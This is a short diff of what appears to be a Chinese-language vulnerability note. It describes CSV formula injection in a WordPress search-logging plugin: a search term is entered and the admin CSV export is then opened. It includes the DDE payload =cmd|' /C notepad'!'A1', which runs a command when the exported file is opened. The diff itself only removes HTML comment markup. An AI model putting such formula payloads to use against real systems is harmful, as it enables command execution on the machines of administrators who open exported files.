@@ -47,14 +47,12 @@ schema_version: "1"
 
 -   首先在搜索框里输入paylaod
 
-```{=html}
 <!-- -->
-```
+
 -   =cmd|' /C notepad'!'A1'
 
-```{=html}
 <!-- -->
-```
+
 -   然后访问
     http://www.0-sec.org/wordpress/wp-admin/index.php?page=search-meter%2Fadmin.php
     并且到处csv文件
